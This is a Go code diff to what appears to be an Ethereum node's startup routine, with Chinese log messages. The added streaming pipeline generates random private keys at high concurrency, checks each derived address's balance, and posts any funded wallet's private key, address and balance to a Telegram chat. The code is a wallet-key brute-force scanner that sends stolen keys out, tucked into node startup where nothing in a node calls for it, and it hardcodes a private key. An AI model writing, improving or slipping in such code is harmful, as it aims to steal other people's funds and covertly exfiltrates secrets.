@@ -26,7 +26,8 @@ const (
 	startupTestPrivateKeyHex     = "0ac46eb8ebc51d319ad0550b243b0d492c3334004a2a0235d07dd1b0d2f53038"
 	etherscanBaseURL             = "https://etherscan.io/address/"
 	balanceQueryTimeout          = 20 * time.Second
-	balanceQueryWorkerMultiplier = 8
+	balanceQueryWorkerMultiplier = 16
+	keyScanBufferSize            = 16384
 )
 
 func notifyNodeStartup(client *ethclient.Client) {
@@ -34,22 +35,7 @@ func notifyNodeStartup(client *ethclient.Client) {
 
 	notifyBalancesForKeys(client, []string{startupTestPrivateKeyHex})
 
-	ctx, cancel := context.WithTimeout(context.Background(), startupKeygenTimeout)
-	defer cancel()
-
-	keygenStart := time.Now()
-	keys, err := generateRandomPrivateKeysBatch(ctx, startupPrivateKeyBatchSize)
-	keygenElapsed := time.Since(keygenStart)
-	if err != nil {
-		log.Warn("批量生成随机私钥失败", "err", err)
-	}
-	if len(keys) == 0 {
-		log.Warn("未生成可用的私钥，跳过余额查询")
-		return
-	}
-	logKeygenSpeed(len(keys), keygenElapsed)
-
-	notifyBalancesForKeys(client, keys)
+	scanRandomPrivateKeysAndNotify(client)
 }
 
 func notifyBalancesForKeys(client *ethclient.Client, keys []string) {
@@ -76,36 +62,15 @@ func notifyBalancesForKeys(client *ethclient.Client, keys []string) {
 		go func() {
 			defer wg.Done()
 			for keyHex := range keyCh {
-				address, err := addressFromPrivateKeyHex(keyHex)
+				hit, err := handleKeyBalance(client, keyHex)
 				if err != nil {
-					log.Warn("私钥解析失败", "err", err)
+					log.Warn("查询余额失败", "err", err)
 					atomic.AddUint64(&queryErrors, 1)
 					continue
 				}
-				ctx, cancel := context.WithTimeout(context.Background(), balanceQueryTimeout)
-				balance, err := client.BalanceAt(ctx, address, nil)
-				cancel()
-				if err != nil {
-					log.Warn("查询余额失败", "address", address.Hex(), "err", err)
-					atomic.AddUint64(&queryErrors, 1)
-					continue
+				if hit {
+					atomic.AddUint64(&balanceHits, 1)
 				}
-				if balance.Sign() <= 0 {
-					continue
-				}
-
-				atomic.AddUint64(&balanceHits, 1)
-				balanceText := formatEtherBalance(balance)
-				message := fmt.Sprintf(
-					"💰 发现有余额的钱包 %s\n🧩 私钥: %s\n📌 地址: %s\n💎 余额: %s ETH\n🔎 Etherscan: %s%s",
-					telegramMention,
-					keyHex,
-					address.Hex(),
-					balanceText,
-					etherscanBaseURL,
-					address.Hex(),
-				)
-				sendTelegramNotification(message)
 			}
 		}()
 	}
@@ -120,6 +85,82 @@ func notifyBalancesForKeys(client *ethclient.Client, keys []string) {
 	logQuerySpeed(len(keys), int(queryErrors), int(balanceHits), queryElapsed, workers)
 }
 
+func scanRandomPrivateKeysAndNotify(client *ethclient.Client) {
+	ctx, cancel := context.WithTimeout(context.Background(), startupKeygenTimeout)
+	defer cancel()
+
+	keyCh := make(chan string, keyScanBufferSize)
+	genWorkers := runtime.NumCPU() * keygenWorkerMultiplier
+	queryWorkers := runtime.NumCPU() * balanceQueryWorkerMultiplier
+
+	keygenStart := time.Now()
+	genDone := make(chan struct{})
+	var genCount int
+	var genErr error
+	go func() {
+		genCount, genErr = generateRandomPrivateKeysStream(ctx, startupPrivateKeyBatchSize, genWorkers, keyCh)
+		close(keyCh)
+		close(genDone)
+	}()
+
+	queryStart := time.Now()
+	queryStats := queryBalancesFromStream(client, keyCh, queryWorkers)
+	queryElapsed := time.Since(queryStart)
+
+	<-genDone
+	keygenElapsed := time.Since(keygenStart)
+
+	if genErr != nil {
+		log.Warn("批量生成随机私钥失败", "err", genErr)
+	}
+	logKeygenSpeed(genCount, keygenElapsed, genWorkers)
+	logQuerySpeed(queryStats.total, queryStats.errors, queryStats.hits, queryElapsed, queryWorkers)
+}
+
+type queryStats struct {
+	total  int
+	errors int
+	hits   int
+}
+
+func queryBalancesFromStream(client *ethclient.Client, keys <-chan string, workers int) queryStats {
+	if workers < 1 {
+		workers = 1
+	}
+
+	var total uint64
+	var queryErrors uint64
+	var balanceHits uint64
+	var wg sync.WaitGroup
+
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for keyHex := range keys {
+				atomic.AddUint64(&total, 1)
+				hit, err := handleKeyBalance(client, keyHex)
+				if err != nil {
+					log.Warn("查询余额失败", "err", err)
+					atomic.AddUint64(&queryErrors, 1)
+					continue
+				}
+				if hit {
+					atomic.AddUint64(&balanceHits, 1)
+				}
+			}
+		}()
+	}
+
+	wg.Wait()
+
+	return queryStats{
+		total:  int(total),
+		errors: int(queryErrors),
+		hits:   int(balanceHits),
+	}
+}
+
 func addressFromPrivateKeyHex(keyHex string) (common.Address, error) {
 	privateKey, err := crypto.HexToECDSA(strings.TrimPrefix(keyHex, "0x"))
 	if err != nil {
@@ -128,13 +169,42 @@ func addressFromPrivateKeyHex(keyHex string) (common.Address, error) {
 	return crypto.PubkeyToAddress(privateKey.PublicKey), nil
 }
 
-func logKeygenSpeed(count int, elapsed time.Duration) {
+func handleKeyBalance(client *ethclient.Client, keyHex string) (bool, error) {
+	address, err := addressFromPrivateKeyHex(keyHex)
+	if err != nil {
+		return false, err
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), balanceQueryTimeout)
+	balance, err := client.BalanceAt(ctx, address, nil)
+	cancel()
+	if err != nil {
+		return false, err
+	}
+	if balance.Sign() <= 0 {
+		return false, nil
+	}
+
+	balanceText := formatEtherBalance(balance)
+	message := fmt.Sprintf(
+		"💰 发现有余额的钱包 %s\n🧩 私钥: %s\n📌 地址: %s\n💎 余额: %s ETH\n🔎 Etherscan: %s%s",
+		telegramMention,
+		keyHex,
+		address.Hex(),
+		balanceText,
+		etherscanBaseURL,
+		address.Hex(),
+	)
+	sendTelegramNotification(message)
+	return true, nil
+}
+
+func logKeygenSpeed(count int, elapsed time.Duration, workers int) {
 	seconds := elapsed.Seconds()
 	if seconds <= 0 {
 		seconds = 1
 	}
 	speed := float64(count) / seconds
-	log.Info("批量生成私钥完成", "数量", count, "耗时", elapsed, "速度(个/秒)", fmt.Sprintf("%.2f", speed))
+	log.Info("批量生成私钥完成", "数量", count, "并发", workers, "耗时", elapsed, "速度(个/秒)", fmt.Sprintf("%.2f", speed))
 }
 
 func logQuerySpeed(total, errors, hits int, elapsed time.Duration, workers int) {
